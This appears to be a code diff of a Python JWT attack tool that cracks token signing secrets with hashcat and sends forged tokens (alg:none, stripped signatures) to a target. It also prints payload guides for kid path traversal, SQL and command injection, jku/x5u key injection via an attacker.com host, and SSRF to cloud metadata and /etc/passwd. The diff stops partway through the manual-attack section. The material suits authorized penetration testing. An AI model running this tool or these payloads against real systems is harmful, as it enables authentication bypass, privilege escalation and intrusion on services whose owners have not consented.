@@ -1,28 +1,42 @@
 #!/usr/bin/env python3
 """
-Automated JWT Security Tester
+JWTCannon - Automated JWT Security Tester (Hashcat Edition)
 Input: Burp Suite saved request (text file)
-
-On expired tokens: tells the user to re-capture a fresh request from Burp
-(relying on their app's own refresh-token flow). Does NOT guess refresh endpoints.
+Output: Colorful terminal output
 """
 
 import argparse
 import base64
 import hashlib
 import hmac
-import itertools
 import json
-import multiprocessing as mp
 import os
 import re
+import shutil
+import subprocess
 import sys
-import threading
+import tempfile
 import time
 import urllib3
 import requests
 
+from colorama import Fore, Back, Style, init as colorama_init
+
+colorama_init(autoreset=True)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ---------- Proxy support ----------
+
+PROXY_URL = None
+
+def get_proxies():
+    """Return requests proxies dict, or None if no proxy configured."""
+    if not PROXY_URL:
+        return None
+    return {"http": PROXY_URL, "https": PROXY_URL}
+
+def c_proxy(msg):
+    return f"{Fore.BLUE}[proxy]{Style.RESET_ALL} {msg}"
 
 # ---------- Constants ----------
 
@@ -36,11 +50,37 @@ NONE_VARIANTS = [
 SECLISTS_PATHS = [
     '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
     '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt',
-    '/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
-    '/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
+    '/usr/share/seclists/Passwords/Common-Credentials/rockyou.txt'
 ]
 
+HASHCAT_RULE_PATHS = [
+    "/usr/share/hashcat/rules/best64.rule",
+    "/usr/lib/hashcat/rules/best64.rule",
+    "/usr/local/share/hashcat/rules/best64.rule",
+    "/opt/hashcat/rules/best64.rule",
+    "/usr/share/doc/hashcat/rules/best64.rule",
+    "/opt/homebrew/share/hashcat/rules/best64.rule",
+    "C:\\hashcat\\rules\\best64.rule",
+]
+
+def find_best64_rule():
+    """Return path to best64.rule, or None if not found."""
+    for p in HASHCAT_RULE_PATHS:
+        if os.path.isfile(p):
+            return p
+    return None
+
 SEPARATOR = "=" * 70
+
+# ---------- Color Helpers ----------
+
+def c_info(msg):    return f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}"
+def c_ok(msg):      return f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}"
+def c_warn(msg):    return f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}"
+def c_fail(msg):    return f"{Fore.RED}[-]{Style.RESET_ALL} {msg}"
+def c_hit(msg):     return f"{Back.RED}{Fore.WHITE}[VULNERABLE]{Style.RESET_ALL} {msg}"
+def c_title(msg):   return f"{Fore.MAGENTA}{Style.BRIGHT}{msg}{Style.RESET_ALL}"
+def c_sep():        return f"{Fore.MAGENTA}{SEPARATOR}{Style.RESET_ALL}"
 
 # ---------- Base64URL ----------
 
@@ -112,7 +152,6 @@ def parse_jwt(token: str):
     }
 
 def expiry_status(jwt_info, skew: int = 30):
-    """Return (state, ttl_seconds) where state is 'missing'|'valid'|'expired'."""
     exp = jwt_info["payload"].get("exp")
     if exp is None:
         return "missing", None
@@ -127,25 +166,24 @@ def expiry_status(jwt_info, skew: int = 30):
     return "valid", ttl
 
 def handle_token_expiry(jwt_info):
-    """Print status; if expired, prompt the user to re-capture. Return True to continue."""
     state, ttl = expiry_status(jwt_info)
 
     if state == "missing":
-        print("[*] Token has no 'exp' claim.")
+        print(c_info("Token has no 'exp' claim."))
         return True
 
     if state == "valid":
         h = ttl // 3600
         m = (ttl % 3600) // 60
         s = ttl % 60
-        print(f"[*] Token valid for ~{ttl}s ({h}h {m}m {s}s)")
+        print(c_info(f"Token valid for ~{ttl}s ({h}h {m}m {s}s)"))
         return True
 
-    # Expired
-    print("\n" + SEPARATOR)
-    print("[!] TOKEN IS EXPIRED")
-    print(SEPARATOR)
-    print(f"[!] exp was {abs(ttl)}s ago.")
+    print()
+    print(c_sep())
+    print(c_warn("TOKEN IS EXPIRED"))
+    print(c_sep())
+    print(c_warn(f"exp was {abs(ttl)}s ago."))
     print()
     print("What to do now:")
     print("  1. Open the same request in Burp Repeater / Proxy.")
@@ -155,17 +193,17 @@ def handle_token_expiry(jwt_info):
     print("     and overwrite your input request file.")
     print("  4. Re-run this script.")
     print()
-    print("Note: This tool intentionally does NOT guess refresh endpoints.")
-    print("      Expired tokens will produce false results for bypass tests.")
+    print(c_info("This tool intentionally does NOT guess refresh endpoints."))
+    print(c_info("Expired tokens produce false results for bypass tests."))
     print()
     try:
-        answer = input("Continue anyway with the expired token? [y/N]: ").strip().lower()
+        answer = input(f"{Fore.YELLOW}Continue anyway with the expired token? [y/N]: {Style.RESET_ALL}").strip().lower()
     except (EOFError, KeyboardInterrupt):
         answer = "n"
     if answer != "y":
-        print("[*] Exiting so you can re-capture a fresh request.")
+        print(c_info("Exiting so you can re-capture a fresh request."))
         sys.exit(0)
-    print("[!] Continuing with the expired token. Results may be misleading.\n")
+    print(c_warn("Continuing with the expired token. Results may be misleading."))
     return True
 
 # ---------- HTTP sending ----------
@@ -204,18 +242,21 @@ def send_with_token(req: dict, original_token: str, new_token: str,
         return requests.request(
             mod["method"], url, headers=headers,
             data=mod["body"] if mod["body"] else None,
-            timeout=timeout, verify=False, allow_redirects=False,
+            timeout=timeout,
+            verify=False,
+            allow_redirects=False,
+            proxies=get_proxies(),   # <-- added
         )
     except Exception:
         return None
 
 def baseline_response(req, jwt_info, scheme):
-    print("[*] Sending baseline request with original token...")
+    print(c_info("Sending baseline request with original token..."))
     r = send_with_token(req, jwt_info["raw"], jwt_info["raw"], scheme)
     if r is None:
-        print("[!] Could not reach target. Check host/scheme/connectivity.")
+        print(c_fail("Could not reach target. Check host/scheme/connectivity."))
         return None
-    print(f"[*] Baseline: HTTP {r.status_code}, {len(r.content)} bytes")
+    print(c_info(f"Baseline: HTTP {r.status_code}, {len(r.content)} bytes"))
     return r
 
 def looks_like_bypass(test_resp, base_resp):
@@ -225,12 +266,270 @@ def looks_like_bypass(test_resp, base_resp):
         return False
     return abs(len(test_resp.content) - len(base_resp.content)) < 50
 
+# ---------- Hashcat Detection ----------
+
+def find_hashcat():
+    """Return path to hashcat binary, or None."""
+    for name in ("hashcat", "hashcat64.exe", "hashcat.bin"):
+        path = shutil.which(name)
+        if path:
+            return path
+    return None
+    
+def check_hashcat_backend(hashcat_path):
+    """Return True if hashcat has a usable compute backend (OpenCL/CUDA/HIP)."""
+    try:
+        proc = subprocess.run([hashcat_path, "-I"],
+                              capture_output=True, text=True, timeout=30)
+    except Exception as e:
+        print(c_warn(f"Could not query hashcat backends: {e}"))
+        return False
+
+    out = proc.stdout + proc.stderr
+
+    if ("CL_PLATFORM_NOT_FOUND_KHR" in out
+            or "No OpenCL" in out
+            or "No devices found" in out):
+        print()
+        print(c_fail("Hashcat has NO usable backend (OpenCL/CUDA/HIP)."))
+        print(c_warn("On Kali, install the CPU OpenCL runtime:"))
+        print(f"  {Fore.GREEN}sudo apt install -y pocl-opencl-icd clinfo{Style.RESET_ALL}")
+        print(c_warn("Then verify with:  hashcat -I"))
+        print()
+        return False
+
+    print(c_ok("Hashcat backend detected:"))
+    for line in out.splitlines():
+        if any(k in line for k in ("Name", "Type", "Vendor", "Device ID", "Platform ID")):
+            print(f"  {Fore.CYAN}{line.strip()}{Style.RESET_ALL}")
+    return True
+
+
+def check_hashcat_available():
+    hc = find_hashcat()
+    if not hc:
+        print(c_fail("Hashcat NOT FOUND in PATH."))
+        print(c_info("Install with:  sudo apt install hashcat"))
+        return None
+    try:
+        ver = subprocess.run([hc, "--version"], capture_output=True, text=True, timeout=10)
+        ver_str = ver.stdout.strip() or ver.stderr.strip()
+        print(c_ok(f"Hashcat found: {hc}  ({ver_str})"))
+    except Exception as e:
+        print(c_warn(f"Hashcat found at {hc} but version check failed: {e}"))
+    return hc
+
+# ---------- Hashcat Cracking ----------
+
+def write_hashfile(jwt_info, path):
+    """Write the full JWT to a file for hashcat mode 16500."""
+    with open(path, "w") as f:
+        f.write(jwt_info["raw"] + "\n")
+
+def build_mask(charset_choice):
+    """
+    Build (custom_charset_string, custom_placeholder).
+
+    Instead of using ?l/?d separately per position, we build a SINGLE custom
+    charset that combines all selected character classes, then use ?1 for
+    every position in the mask.
+
+    charset_choice examples:
+        'an'  -> lowercase + digits          (36 chars)
+        'aA'  -> lower + upper               (52 chars)
+        'ans' -> lower + digits + special    (69 chars)
+        'all' -> lower + upper + digits + special  (~90 chars)
+    """
+    parts = []
+    if 'a' in charset_choice:
+        parts.append('?l')
+    if 'A' in charset_choice:
+        parts.append('?u')
+    if 'n' in charset_choice:
+        parts.append('?d')
+    if 's' in charset_choice:
+        parts.append('?s')
+
+    if not parts:
+        parts = ['?l', '?d']   # default
+
+    # Custom charset 1 = all selected classes combined
+    custom_charset = "".join(parts)
+    return custom_charset, "?1"
+
+def crack_with_hashcat_wordlist(jwt_info, hashcat_path, wordlist_path):
+    print()
+    print(c_sep())
+    print(c_title("TEST 5a: Hashcat Wordlist Attack"))
+    print(c_sep())
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        hashfile = os.path.join(tmpdir, "jwt.hash")
+        potfile  = os.path.join(tmpdir, "hashcat.potfile")
+        write_hashfile(jwt_info, hashfile)
+
+        cmd = [
+            hashcat_path,
+            "-a", "0",
+            "-m", "16500",
+            hashfile,
+            wordlist_path,
+            "--potfile-path", potfile,
+            "--status",
+            "--status-timer", "5",
+            "--force",
+            "-O",
+            "-w", "3",
+        ]
+
+        # Add best64.rule only if it exists
+        rule_path = find_best64_rule()
+        if rule_path:
+            cmd += ["-r", rule_path]
+            print(c_info(f"Using rules: {rule_path}"))
+        else:
+            print(c_warn("best64.rule not found — running wordlist without rules."))
+            print(c_info("Install rules:  sudo apt install hashcat-data   (or hashcat)"))
+            print(c_info("Common paths searched:"))
+            for rp in HASHCAT_RULE_PATHS:
+                print(f"    - {rp}")
+
+        print(c_info(f"Hashcat command: {' '.join(cmd)}"))
+        print()
+
+        try:
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
+        except subprocess.TimeoutExpired:
+            print(c_warn("Hashcat wordlist attack timed out (1 hour)."))
+            return None
+        except Exception as e:
+            print(c_fail(f"Hashcat error: {e}"))
+            return None
+
+        out = proc.stdout + proc.stderr
+        print(out)
+
+        if os.path.isfile(potfile):
+            with open(potfile) as f:
+                for line in f:
+                    if ":" in line:
+                        secret = line.split(":", 1)[1].strip()
+                        print(c_ok(f"SECRET FOUND in wordlist: {secret!r}"))
+                        return secret
+
+        print(c_fail("No match in wordlist."))
+        return None
+
+def crack_with_hashcat_mask(jwt_info, hashcat_path, charset_choice, min_len, max_len):
+    print()
+    print(c_sep())
+    print(c_title("TEST 5b: Hashcat Mask / Incremental Brute-Force"))
+    print(c_sep())
+
+    custom_charset, placeholder = build_mask(charset_choice)
+
+    # Build the full mask: ?1 repeated max_len times
+    full_mask = placeholder * max_len
+
+    # Rough size estimate for the warning
+    charset_size = 0
+    if 'a' in charset_choice: charset_size += 26
+    if 'A' in charset_choice: charset_size += 26
+    if 'n' in charset_choice: charset_size += 10
+    if 's' in charset_choice: charset_size += 32
+    if charset_size == 0:
+        charset_size = 36
+    space = sum(charset_size ** L for L in range(min_len, max_len + 1))
+
+    print(c_info(f"Charset choice : {charset_choice!r}"))
+    print(c_info(f"Charset size   : {charset_size}"))
+    print(c_info(f"Length range   : {min_len}-{max_len}"))
+    print(c_info(f"Custom charset : -1 {custom_charset}"))
+    print(c_info(f"Mask           : {full_mask}   (each '?1' = one char from custom set)"))
+    print(c_info(f"Approx space   : {space:,}"))
+    print(c_info("Using --increment so hashcat tries shorter lengths first."))
+    print()
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        hashfile = os.path.join(tmpdir, "jwt.hash")
+        potfile  = os.path.join(tmpdir, "hashcat.potfile")
+        write_hashfile(jwt_info, hashfile)
+
+        cmd = [
+            hashcat_path,
+            "-a", "3",
+            "-m", "16500",
+            hashfile,
+            "-1", custom_charset,
+            full_mask,
+            "--increment",
+            "--increment-min", str(min_len),
+            "--increment-max", str(max_len),
+            "--potfile-path", potfile,
+            "--status",
+            "--status-timer", "5",
+            "--force",
+            "-O",
+            "-w", "3",
+        ]
+
+        print(c_info(f"Hashcat command: {' '.join(cmd)}"))
+        print(c_warn("This may take a long time. Press Ctrl+C to stop."))
+        print()
+
+        start = time.time()
+        try:
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1,
+            )
+            for line in proc.stdout:
+                line = line.rstrip("\n")
+                if "Progress" in line or "Recovered" in line or "Time.Started" in line:
+                    print(f"  {Fore.CYAN}{line}{Style.RESET_ALL}")
+                elif "Cracked" in line or "Recovered........: 1/1" in line:
+                    print(f"  {Fore.GREEN}{line}{Style.RESET_ALL}")
+                elif "ERROR" in line or "WARNING" in line or "No such file" in line:
+                    print(f"  {Fore.YELLOW}{line}{Style.RESET_ALL}")
+            proc.wait(timeout=60)
+        except KeyboardInterrupt:
+            print()
+            print(c_warn("Interrupted. Stopping hashcat..."))
+            proc.terminate()
+            try:
+                proc.wait(timeout=10)
+            except Exception:
+                proc.kill()
+            return None
+        except Exception as e:
+            print(c_fail(f"Hashcat error: {e}"))
+            return None
+
+        elapsed = time.time() - start
+
+        if os.path.isfile(potfile):
+            with open(potfile) as f:
+                for line in f:
+                    if ":" in line:
+                        secret = line.split(":", 1)[1].strip()
+                        print()
+                        print(c_ok(f"SECRET FOUND: {secret!r}  (after {elapsed:.1f}s)"))
+                        return secret
+
+        print()
+        print(c_fail("Not found within search space."))
+        return None
+
 # ---------- Test 1: alg:none ----------
 
 def test_alg_none(req, jwt_info, base_resp, scheme):
-    print("\n" + SEPARATOR)
-    print("TEST 1: alg:none Attack Variations")
-    print(SEPARATOR)
+    print()
+    print(c_sep())
+    print(c_title("TEST 1: alg:none Attack Variations"))
+    print(c_sep())
 
     hits = []
     original_header = jwt_info["header"]
@@ -244,28 +543,32 @@ def test_alg_none(req, jwt_info, base_resp, scheme):
 
         resp = send_with_token(req, jwt_info["raw"], new_token, scheme)
         if resp is None:
-            print(f"  alg={variant!r:10} -> request failed")
+            print(f"  {c_fail(f'alg={variant!r:10} -> request failed')}")
             continue
         bypass = looks_like_bypass(resp, base_resp)
-        marker = "  <-- POSSIBLE BYPASS" if bypass else ""
-        print(f"  alg={variant!r:10} -> HTTP {resp.status_code} "
+        marker = f"  {Back.RED}{Fore.WHITE} POSSIBLE BYPASS {Style.RESET_ALL}" if bypass else ""
+        status_color = Fore.GREEN if not bypass else Fore.RED
+        print(f"  alg={variant!r:10} -> {status_color}HTTP {resp.status_code}{Style.RESET_ALL} "
               f"({len(resp.content)} bytes){marker}")
         if bypass:
             hits.append(variant)
 
     if hits:
-        print(f"\n[!] POTENTIAL alg:none BYPASS with: {hits}")
-        print("[!] Try modifying payload claims (role:admin, user_id:1) and resend.")
+        print()
+        print(c_hit(f"POTENTIAL alg:none BYPASS with: {hits}"))
+        print(c_warn("Try modifying payload claims (role:admin, user_id:1) and resend."))
     else:
-        print("\n[+] Server appears to reject alg:none variants.")
+        print()
+        print(c_ok("Server appears to reject alg:none variants."))
     return hits
 
 # ---------- Test 2: signature stripping ----------
 
 def test_sig_stripping(req, jwt_info, base_resp, scheme):
-    print("\n" + SEPARATOR)
-    print("TEST 2: Signature Stripping")
-    print(SEPARATOR)
+    print()
+    print(c_sep())
+    print(c_title("TEST 2: Signature Stripping"))
+    print(c_sep())
 
     hb, pb = jwt_info["header_b64"], jwt_info["payload_b64"]
     variants = [
@@ -278,21 +581,24 @@ def test_sig_stripping(req, jwt_info, base_resp, scheme):
     for name, token in variants:
         resp = send_with_token(req, jwt_info["raw"], token, scheme)
         if resp is None:
-            print(f"  {name:35} -> request failed")
+            print(f"  {name:35} -> {c_fail('request failed')}")
             continue
         bypass = looks_like_bypass(resp, base_resp)
-        marker = "  <-- ACCEPTED! VULNERABLE!" if bypass else ""
-        print(f"  {name:35} -> HTTP {resp.status_code} "
+        marker = f"  {Back.RED}{Fore.WHITE} ACCEPTED! VULNERABLE! {Style.RESET_ALL}" if bypass else ""
+        status_color = Fore.GREEN if not bypass else Fore.RED
+        print(f"  {name:35} -> {status_color}HTTP {resp.status_code}{Style.RESET_ALL} "
               f"({len(resp.content)} bytes){marker}")
         if bypass:
             hit = name
 
     if hit:
-        print(f"\n[!] Server accepted unsigned token ({hit}).")
-        print("[!] NEXT STEP: Modify claims (role -> admin, is_admin -> true,")
-        print("    user_id -> 1, sub -> administrator), re-encode, resend.")
+        print()
+        print(c_hit(f"Server accepted unsigned token ({hit})."))
+        print(c_warn("NEXT STEP: Modify claims (role -> admin, is_admin -> true,"))
+        print(c_warn("  user_id -> 1, sub -> administrator), re-encode, resend."))
     else:
-        print("\n[+] Server appears to require a valid signature.")
+        print()
+        print(c_ok("Server appears to require a valid signature."))
     return hit
 
 # ---------- Test 3: kid ----------
@@ -301,29 +607,36 @@ def analyze_kid(jwt_info):
     header = jwt_info["header"]
     if "kid" not in header:
         return False
-    print("\n" + SEPARATOR)
-    print("TEST 3: 'kid' Header Detected - Attack Guide")
-    print(SEPARATOR)
-    print(f"[!] kid value: {header['kid']!r}\n")
+    print()
+    print(c_sep())
+    print(c_title("TEST 3: 'kid' Header Detected - Attack Guide"))
+    print(c_sep())
+    print(c_warn(f"kid value: {header['kid']!r}"))
+    print()
     print("The 'kid' tells the server which key to load for verification.")
-    print("If unsanitized, this is a high-impact attack surface.\n")
+    print("If unsanitized, this is a high-impact attack surface.")
+    print()
 
-    print("  1. Path Traversal (read file as HMAC key)")
+    print(f"{Fore.YELLOW}  1. Path Traversal (read file as HMAC key){Style.RESET_ALL}")
     print("     - kid = ../../../../dev/null  -> sign with EMPTY secret")
     print("     - kid = ../../../../etc/hostname")
     print("     - kid = ../../../../proc/sys/kernel/randomize_va_space")
-    print("     - kid = ../../../../tmp/known.txt\n")
-    print("  2. SQL Injection in key lookup")
+    print("     - kid = ../../../../tmp/known.txt")
+    print()
+    print(f"{Fore.YELLOW}  2. SQL Injection in key lookup{Style.RESET_ALL}")
     print("     - kid = ' UNION SELECT 'mysecret'--   (sign with 'mysecret')")
     print("     - kid = ' OR '1'='1")
     print("     - kid = ' OR SLEEP(5)--   (blind time-based)")
-    print("     - Enumerate with sqlmap if kid is reflected in query\n")
-    print("  3. Command Injection")
+    print("     - Enumerate with sqlmap if kid is reflected in query")
+    print()
+    print(f"{Fore.YELLOW}  3. Command Injection{Style.RESET_ALL}")
     print("     - kid = | whoami")
     print("     - kid = $(whoami)")
-    print("     - kid = `id`\n")
-    print("  4. Directory Traversal + Null Byte (older Java)")
-    print("     - kid = ../../../../dev/null%00\n")
+    print("     - kid = `id`")
+    print()
+    print(f"{Fore.YELLOW}  4. Directory Traversal + Null Byte (older Java){Style.RESET_ALL}")
+    print("     - kid = ../../../../dev/null%00")
+    print()
     return True
 
 # ---------- Test 4: jku / x5u ----------
@@ -334,360 +647,263 @@ def analyze_jku_x5u(jwt_info):
     has_x5u = "x5u" in header
     if not (has_jku or has_x5u):
         return False
-    print("\n" + SEPARATOR)
-    print("TEST 4: 'jku' / 'x5u' Header Detected - Attack Guide")
-    print(SEPARATOR)
+    print()
+    print(c_sep())
+    print(c_title("TEST 4: 'jku' / 'x5u' Header Detected - Attack Guide"))
+    print(c_sep())
 
     if has_jku:
-        print(f"[!] jku value: {header['jku']!r}\n")
-        print("JKU Injection:")
+        print(c_warn(f"jku value: {header['jku']!r}"))
+        print()
+        print(f"{Fore.YELLOW}JKU Injection:{Style.RESET_ALL}")
         print("  1. openssl genrsa -out attacker.key 2048")
         print("     openssl rsa -in attacker.key -pubout -out attacker.pub")
         print("  2. Host a JWKS with your public key at attacker.com/jwks.json")
         print("  3. Sign token with attacker.key (RS256) and set")
-        print('     "jku": "https://attacker.com/jwks.json"')
-        print("  4. Server fetches your JWKS -> verification succeeds with YOUR key.\n")
-        print("  Also test SSRF:")
+        print('     \"jku\": \"https://attacker.com/jwks.json\"')
+        print("  4. Server fetches your JWKS -> verification succeeds with YOUR key.")
+        print()
+        print(f"{Fore.YELLOW}  Also test SSRF:{Style.RESET_ALL}")
         print("     - jku = http://169.254.169.254/latest/meta-data/")
         print("     - jku = http://127.0.0.1:8080/actuator/env")
-        print("     - jku = file:///etc/passwd\n")
+        print("     - jku = file:///etc/passwd")
+        print()
 
     if has_x5u:
-        print(f"[!] x5u value: {header['x5u']!r}\n")
-        print("X5U Injection:")
+        print(c_warn(f"x5u value: {header['x5u']!r}"))
+        print()
+        print(f"{Fore.YELLOW}X5U Injection:{Style.RESET_ALL}")
         print("  1. openssl req -x509 -newkey rsa:2048 -keyout attacker.key \\")
         print("       -out attacker.pem -days 365 -nodes -subj '/CN=attacker'")
         print("  2. Host attacker.pem at attacker.com/cert.pem")
         print("  3. Sign JWT with attacker.key (RS256), set")
-        print('     "x5u": "https://attacker.com/cert.pem"')
-        print("  4. Send; server trusts your cert -> bypass.\n")
+        print('     \"x5u\": \"https://attacker.com/cert.pem\"')
+        print("  4. Send; server trusts your cert -> bypass.")
+        print()
     return True
 
 # ---------- Cracking config ----------
 
-CHARSET_SETS = {
-    "A": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-    "a": "abcdefghijklmnopqrstuvwxyz",
-    "n": "0123456789",
-    "s": "!@#$%^&*()_+-=[]{}|;:,.<>?~",
-}
-
 def prompt_crack_config():
-    print("\n" + SEPARATOR)
-    print("CRACKING CONFIGURATION")
-    print(SEPARATOR)
+    print()
+    print(c_sep())
+    print(c_title("CRACKING CONFIGURATION"))
+    print(c_sep())
     print("Character set options:")
-    print("  A   = Uppercase (A-Z)")
-    print("  a   = Lowercase (a-z)")
-    print("  n   = Numbers (0-9)")
-    print("  s   = Special characters")
+    print(f"  {Fore.GREEN}A{Style.RESET_ALL}   = Uppercase (A-Z)")
+    print(f"  {Fore.GREEN}a{Style.RESET_ALL}   = Lowercase (a-z)")
+    print(f"  {Fore.GREEN}n{Style.RESET_ALL}   = Numbers (0-9)")
+    print(f"  {Fore.GREEN}s{Style.RESET_ALL}   = Special characters")
     print("  (combine: 'an', 'aA', 'ans', or 'all')")
     print()
 
     try:
-        choice = input("Charset [default: an]: ").strip() or "an"
-        min_len = int(input("Min length [default: 5]: ").strip() or "5")
-        max_len = int(input("Max length [default: 12]: ").strip() or "12")
+        choice = input(f"{Fore.CYAN}Charset [default: an]: {Style.RESET_ALL}").strip() or "an"
+        min_len = int(input(f"{Fore.CYAN}Min length [default: 5]: {Style.RESET_ALL}").strip() or "5")
+        max_len = int(input(f"{Fore.CYAN}Max length [default: 12]: {Style.RESET_ALL}").strip() or "12")
+        if choice.lower() == "all":
+            choice = "aAns"
     except (EOFError, KeyboardInterrupt):
-        print("\n[!] Using defaults.")
+        print(c_warn("Using defaults."))
         choice, min_len, max_len = "an", 5, 12
-
-    if choice.lower() == "all":
-        charset = "".join(CHARSET_SETS.values())
-    else:
-        charset = "".join(CHARSET_SETS[c] for c in choice if c in CHARSET_SETS)
-        if not charset:
-            charset = CHARSET_SETS["a"] + CHARSET_SETS["n"]
-    charset = "".join(dict.fromkeys(charset))
 
     if min_len < 1:
         min_len = 1
     if max_len < min_len:
         max_len = min_len
 
-    space = sum(len(charset) ** L for L in range(min_len, max_len + 1))
-    print(f"\n[*] Charset size: {len(charset)}")
-    print(f"[*] Length range: {min_len}-{max_len}")
-    print(f"[*] Total keyspace: {space:,} candidates")
-    if space > 10_000_000_000:
-        print("[!] WARNING: keyspace is enormous. Python will NOT finish this.")
-        print("[!] Use Hashcat (-m 16500) for large searches, or reduce max_len.")
-        try:
-            if input("Continue anyway? [y/N]: ").strip().lower() != "y":
-                print("[*] Reducing max_len to 8 for feasibility.")
-                max_len = 8
-        except (EOFError, KeyboardInterrupt):
-            max_len = 8
-    return charset, min_len, max_len
-
-# ---------- Cracking: SecLists ----------
-
-def crack_with_seclists(jwt_info):
-    print("\n" + SEPARATOR)
-    print("TEST 5a: Wordlist Attack (SecLists)")
-    print(SEPARATOR)
-
-    path = next((p for p in SECLISTS_PATHS if os.path.isfile(p)), None)
-    if path is None:
-        print("[!] SecLists wordlist NOT FOUND. Looked in:")
-        for p in SECLISTS_PATHS:
-            print(f"    - {p}")
-        print("[!] Install:  sudo apt install seclists")
-        return None
-
-    alg = jwt_info["header"].get("alg", "HS256")
-    if alg not in ("HS256", "HS384", "HS512"):
-        print(f"[!] alg={alg} not HMAC. Cannot crack.")
-        return None
-
-    digestmod = {"HS256": hashlib.sha256,
-                 "HS384": hashlib.sha384,
-                 "HS512": hashlib.sha512}[alg]
-    hp = f"{jwt_info['header_b64']}.{jwt_info['payload_b64']}".encode()
-    expected_sig = jwt_info["signature_b64"]
-
-    print(f"[*] Wordlist: {path}")
-    print(f"[*] Algorithm: {alg}")
-
-    count = 0
-    start = time.time()
-    found = None
-
-    with open(path, "r", encoding="utf-8", errors="ignore") as f:
-        for line in f:
-            candidate = line.rstrip("\r\n")
-            if not candidate:
-                continue
-            count += 1
-            sig = hmac.new(candidate.encode(), hp, digestmod).digest()
-            if b64url_encode(sig) == expected_sig:
-                found = candidate
-                break
-            if count % 200000 == 0:
-                rate = count / max(0.001, (time.time() - start))
-                print(f"    tried {count:,} ... {rate:,.0f} h/s", end="\r")
-
     print()
-    if found:
-        print(f"[+] SECRET FOUND in wordlist: {found!r}")
-        print(f"[+] Tried {count:,} in {time.time()-start:.2f}s")
-        return found
-    print(f"[-] Wordlist exhausted ({count:,} candidates). No match.")
-    return None
+    print(c_info(f"Charset choice : {choice!r}"))
+    print(c_info(f"Length range   : {min_len}-{max_len}"))
+    print(c_info("Hashcat will handle the search space efficiently."))
+    return choice, min_len, max_len
 
-# ---------- Cracking: incremental brute-force ----------
+# ---------- SecLists discovery ----------
 
-def _brute_worker(hp, expected_sig, alg, charset, start_len, max_len,
-                  stop_event, shared_count):
-    digestmod = {"HS256": hashlib.sha256,
-                 "HS384": hashlib.sha384,
-                 "HS512": hashlib.sha512}[alg]
-    local = 0
-    for length in range(start_len, max_len + 1):
-        for combo in itertools.product(charset, repeat=length):
-            if stop_event.is_set():
-                if local:
-                    with shared_count.get_lock():
-                        shared_count.value += local
-                return None
-            candidate = "".join(combo)
-            sig = hmac.new(candidate.encode(), hp, digestmod).digest()
-            if b64url_encode(sig) == expected_sig:
-                stop_event.set()
-                with shared_count.get_lock():
-                    shared_count.value += local + 1
-                return candidate
-            local += 1
-            if local >= 5000:
-                with shared_count.get_lock():
-                    shared_count.value += local
-                local = 0
-    if local:
-        with shared_count.get_lock():
-            shared_count.value += local
-    return None
-
-def crack_bruteforce(jwt_info, charset, min_len, max_len, workers):
-    print("\n" + SEPARATOR)
-    print("TEST 5b: Incremental Brute-Force")
-    print(SEPARATOR)
-
-    alg = jwt_info["header"].get("alg", "HS256")
-    if alg not in ("HS256", "HS384", "HS512"):
-        print(f"[!] alg={alg} not HMAC. Skipping.")
-        return None
-
-    hp = f"{jwt_info['header_b64']}.{jwt_info['payload_b64']}".encode()
-    expected_sig = jwt_info["signature_b64"]
-    space = sum(len(charset) ** L for L in range(min_len, max_len + 1))
-
-    print(f"[*] Charset     : {charset!r}")
-    print(f"[*] Charset size: {len(charset)}")
-    print(f"[*] Length range: {min_len}-{max_len}")
-    print(f"[*] Search space: {space:,}")
-    print(f"[*] Workers     : {workers}")
-    print("[*] Starting... (Ctrl+C to stop)\n")
-
-    manager = mp.Manager()
-    stop_event = manager.Event()
-    shared_count = manager.Value('L', 0)
-
-    start = time.time()
-    tasks = [(hp, expected_sig, alg, charset, min_len, max_len,
-              stop_event, shared_count) for _ in range(workers)]
-
-    def report_progress():
-        while not stop_event.is_set():
-            time.sleep(5)
-            now = time.time()
-            with shared_count.get_lock():
-                done = shared_count.value
-            if done == 0:
-                continue
-            rate = done / max(0.001, now - start)
-            pct = 100.0 * done / space if space else 0
-            eta = (space - done) / rate if rate > 0 else 0
-            print(f"    [{pct:6.2f}%] tried {done:,} / {space:,} "
-                  f"| {rate:,.0f} h/s | ETA {eta/3600:.1f}h", end="\r")
-
-    t = threading.Thread(target=report_progress, daemon=True)
-    t.start()
-
-    try:
-        with mp.Pool(processes=workers) as pool:
-            results = pool.starmap(_brute_worker, tasks)
-    except KeyboardInterrupt:
-        stop_event.set()
-        print("\n[!] Interrupted.")
-        return None
-    finally:
-        stop_event.set()
-        t.join(timeout=1)
-
-    elapsed = time.time() - start
-    found = next((r for r in results if r), None)
-
-    print()
-    with shared_count.get_lock():
-        total = shared_count.value
-    print(f"[*] Tried {total:,} candidates in {elapsed:.2f}s "
-          f"({total/max(elapsed,0.001):,.0f} h/s)")
-    if found:
-        print(f"[+] SECRET FOUND: {found!r}")
-        return found
-    print("[-] Not found within search space.")
-    return None
+def find_seclists():
+    return next((p for p in SECLISTS_PATHS if os.path.isfile(p)), None)
 
 # ---------- Remaining attacks guide ----------
 
 def print_remaining_attacks(jwt_info):
-    print("\n" + SEPARATOR)
-    print("OTHER ATTACKS TO TEST MANUALLY (NOT AUTOMATED)")
-    print(SEPARATOR)
-    print("1. RS256 -> HS256 Algorithm Confusion")
+    print()
+    print(c_sep())
+    print(c_title("OTHER ATTACKS TO TEST MANUALLY (NOT AUTOMATED)"))
+    print(c_sep())
+    print(f"{Fore.YELLOW}1. RS256 -> HS256 Algorithm Confusion{Style.RESET_ALL}")
     print("   - Fetch server's RSA public key (/.well-known/jwks.json)")
     print("   - Change alg to HS256, sign with PUBLIC KEY PEM bytes as HMAC secret")
-    print("   - Tool: jwt_tool.py <token> -X k -pk public.pem\n")
